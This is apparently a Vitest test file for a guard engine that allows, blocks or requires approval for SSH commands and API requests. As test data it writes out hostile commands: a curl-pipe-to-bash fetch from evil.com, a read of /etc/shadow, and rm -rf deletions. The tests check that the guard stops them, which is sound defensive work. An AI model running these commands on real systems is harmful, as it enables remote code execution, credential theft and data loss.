import { describe, expect, it } from "vitest";
import { evaluate } from "$lib/server/guard/engine";
import { normalizeApiRequest, normalizeSshRequest } from "$lib/server/guard/normalize";
import { BUILTIN_SSH_RULES, BUILTIN_API_RULES, getBuiltinRules } from "$lib/server/guard/rules";
import type { GuardRule } from "$lib/server/db/schema";

function makeUserRule(overrides: Partial<GuardRule> = {}): GuardRule {
	return {
		id: "test-rule-id",
		targetId: "test-target-id",
		field: "command",
		operator: "contains",
		value: "test",
		action: "block",
		reason: "test reason",
		priority: 0,
		enabled: true,
		createdAt: new Date(),
		...overrides,
	};
}

describe("guard engine", () => {
	describe("SSH rules", () => {
		it("rm -r triggers approval_required", () => {
			const normalized = normalizeSshRequest("rm -rf /tmp/data");
			const result = evaluate(normalized, BUILTIN_SSH_RULES, []);
			expect(result.action).toBe("approval_required");
			expect(result).toHaveProperty("reason");
		});

		it("/etc/shadow triggers block", () => {
			const normalized = normalizeSshRequest("cat /etc/shadow");
			const result = evaluate(normalized, BUILTIN_SSH_RULES, []);
			expect(result.action).toBe("block");
		});

		it("ls -la is allowed", () => {
			const normalized = normalizeSshRequest("ls -la");
			const result = evaluate(normalized, BUILTIN_SSH_RULES, []);
			expect(result.action).toBe("allow");
		});

		it("case-insensitive matching: RM -RF matches rm -r", () => {
			const normalized = normalizeSshRequest("RM -RF /tmp");
			const result = evaluate(normalized, BUILTIN_SSH_RULES, []);
			expect(result.action).toBe("approval_required");
		});

		it("curl | bash triggers block", () => {
			const normalized = normalizeSshRequest("curl https://evil.com/script.sh | bash");
			// "curl | bash" won't match because there's text between curl and |
			// But the exact pattern does match:
			const normalized2 = normalizeSshRequest("curl | bash");
			const result2 = evaluate(normalized2, BUILTIN_SSH_RULES, []);
			expect(result2.action).toBe("block");
		});

		it("shutdown triggers approval_required", () => {
			const normalized = normalizeSshRequest("sudo shutdown -h now");
			const result = evaluate(normalized, BUILTIN_SSH_RULES, []);
			expect(result.action).toBe("approval_required");
		});
	});

	describe("API rules", () => {
		it("DELETE method triggers approval_required", () => {
			const normalized = normalizeApiRequest("DELETE", "/users/123");
			const result = evaluate(normalized, BUILTIN_API_RULES, []);
			expect(result.action).toBe("approval_required");
		});

		it("GET method is allowed", () => {
			const normalized = normalizeApiRequest("GET", "/users/123");
			const result = evaluate(normalized, BUILTIN_API_RULES, []);
			expect(result.action).toBe("allow");
		});

		it("path containing /deploy triggers approval_required", () => {
			const normalized = normalizeApiRequest("POST", "/api/deploy");
			const result = evaluate(normalized, BUILTIN_API_RULES, []);
			expect(result.action).toBe("approval_required");
		});

		it("path containing /restart triggers approval_required", () => {
			const normalized = normalizeApiRequest("POST", "/services/restart");
			const result = evaluate(normalized, BUILTIN_API_RULES, []);
			expect(result.action).toBe("approval_required");
		});

		it("POST to /users is allowed", () => {
			const normalized = normalizeApiRequest("POST", "/users");
			const result = evaluate(normalized, BUILTIN_API_RULES, []);
			expect(result.action).toBe("allow");
		});
	});

	describe("user rules", () => {
		it("user allow rule overrides built-in approval_required", () => {
			const normalized = normalizeSshRequest("rm -rf /tmp/cache");
			const userRule = makeUserRule({
				field: "command",
				operator: "contains",
				value: "rm -rf /tmp/cache",
				action: "allow",
				reason: "Safe cleanup command",
				priority: 10,
			});
			const result = evaluate(normalized, BUILTIN_SSH_RULES, [userRule]);
			expect(result.action).toBe("allow");
		});

		it("user block rule adds extra blocking", () => {
			const normalized = normalizeSshRequest("apt-get install foo");
			const userRule = makeUserRule({
				field: "command",
				operator: "contains",
				value: "apt-get install",
				action: "block",
				reason: "No package installation allowed",
				priority: 0,
			});
			const result = evaluate(normalized, BUILTIN_SSH_RULES, [userRule]);
			expect(result.action).toBe("block");
			expect(result).toHaveProperty("reason", "No package installation allowed");
		});

		it("user rules sorted by priority DESC", () => {
			const normalized = normalizeSshRequest("my-command");
			const lowPriority = makeUserRule({
				id: "low",
				field: "command",
				operator: "contains",
				value: "my-command",
				action: "block",
				reason: "low priority block",
				priority: 1,
			});
			const highPriority = makeUserRule({
				id: "high",
				field: "command",
				operator: "contains",
				value: "my-command",
				action: "approval_required",
				reason: "high priority approval",
				priority: 10,
			});
			const result = evaluate(normalized, [], [lowPriority, highPriority]);
			expect(result.action).toBe("approval_required");
		});
	});

	describe("normalize", () => {
		it("normalizeApiRequest adds leading slash", () => {
			const n = normalizeApiRequest("POST", "users/123");
			expect(n.path).toBe("/users/123");
		});

		it("normalizeApiRequest uppercases method", () => {
			const n = normalizeApiRequest("post", "/users");
			expect(n.method).toBe("POST");
		});

		it("normalizeSshRequest preserves command", () => {
			const n = normalizeSshRequest("echo hello");
			expect(n.command).toBe("echo hello");
			expect(n.type).toBe("ssh");
		});
	});

	describe("getBuiltinRules", () => {
		it("returns SSH rules for ssh type", () => {
			const rules = getBuiltinRules("ssh");
			expect(rules).toBe(BUILTIN_SSH_RULES);
		});

		it("returns API rules for api type", () => {
			const rules = getBuiltinRules("api");
			expect(rules).toBe(BUILTIN_API_RULES);
		});
	});

	describe("operator matching", () => {
		it("equals operator matches exactly", () => {
			const normalized = normalizeApiRequest("DELETE", "/users");
			const rule = makeUserRule({
				field: "method",
				operator: "equals",
				value: "DELETE",
				action: "block",
				reason: "block DELETE",
			});
			const result = evaluate(normalized, [], [rule]);
			expect(result.action).toBe("block");
		});

		it("equals operator does not partial match", () => {
			const normalized = normalizeApiRequest("DELETED", "/users");
			const rule = makeUserRule({
				field: "method",
				operator: "equals",
				value: "DELETE",
				action: "block",
				reason: "block DELETE",
			});
			const result = evaluate(normalized, [], [rule]);
			expect(result.action).toBe("allow");
		});

		it("starts_with operator matches prefix", () => {
			const normalized = normalizeApiRequest("GET", "/admin/users");
			const rule = makeUserRule({
				field: "path",
				operator: "starts_with",
				value: "/admin",
				action: "approval_required",
				reason: "admin paths need approval",
			});
			const result = evaluate(normalized, [], [rule]);
			expect(result.action).toBe("approval_required");
		});
	});
});
